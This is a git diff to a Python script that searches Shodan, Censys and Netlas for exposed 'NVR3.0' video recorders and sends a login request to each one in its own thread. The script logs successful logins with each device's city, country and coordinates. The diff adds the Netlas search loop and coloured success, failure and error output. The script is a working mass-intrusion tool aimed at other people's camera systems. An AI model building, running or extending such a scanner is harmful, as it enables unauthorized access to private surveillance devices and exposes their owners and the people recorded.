@@ -1,5 +1,6 @@
 from shodan import Shodan
 from censys.search import CensysHosts
+import netlas
 import config
 import requests
 import threading
@@ -46,10 +47,10 @@ def change_value(value, change=1):
     return wrapper(value, change)
 
 @add_mutex("print_single")
-def print_single(server, status=False):
+def print_single(server, status=False, color="\033[91m"):
     if status:
         change_value("success")
-    print(f"[ \033[92m{counter['success']} \033[97m| \033[33m{counter['failed']} \033[97m| \033[91m{counter['errors']} \033[97m] http://\033[96m{server}\033[97m/")
+    print(f"[ \033[92m{counter['success']} \033[97m| \033[33m{counter['failed']} \033[97m| \033[91m{counter['errors']} \033[97m] http://{color}{server}\033[97m/")
 
 
 @add_mutex("save")
@@ -70,13 +71,15 @@ def send_login_request(server, source, city, country, country_code, long, lat):
             except:
                 pass
 
-            print_single(server, True)
+            print_single(server, status=True, color="\033[92m")
             save(server, r.status_code, count, source, city, country, country_code, long, lat)
         else:
             change_value("failed")
+            print_single(server, color="\033[33m")
 
     except Exception:
         change_value("errors")
+        print_single(server, status=True)
 
     finally:
         change_value("threads", -1)
@@ -89,7 +92,7 @@ def start_thread(*args):
     change_value("threads")
     threading.Thread(target=send_login_request, args=(*args,)).start()
 
-print("\033[92msuccess\t\033[33mfailure\t\033[91merror")
+print("\033[92msuccess\t\033[33mfailure\t\033[91merror\033[97m")
 if config.SHODAN:
     api = Shodan(config.SHODAN_API)
     search_term = 'http.html:NVR3.0'
@@ -115,3 +118,18 @@ if config.CENSYS:
                 city = location["city"] if 'city' in location else 'N/A'
                 start_thread(f"{server['ip']}:{service['port']}", "CENSYS", city, location["country"], location["country_code"], location["coordinates"]["longitude"], location["coordinates"]["latitude"])
                 
+
+if config.NETLAS:
+    netlas_connection = netlas.Netlas(api_key=config.NETLAS_API)
+   
+    count = netlas_connection.count("http.body:NVR3.0")["count"]
+    for page in range(math.ceil(count/20)):
+
+        query_res = netlas_connection.query(query="http.body:NVR3.0", page=page)
+        for server in query_res["items"]:
+            if not 'geo' in server["data"]:
+                continue
+            city = server["data"]["geo"]["city"] if 'city' in server["data"]["geo"] else 'N/A'
+            start_thread(f"{server['data']['ip']}:{server['data']['port']}", "NETLAS", city, server["data"]["geo"]["country"], server["data"]["geo"]["country"], server["data"]["geo"]["location"]["long"], server["data"]["geo"]["location"]["lat"])
+
+
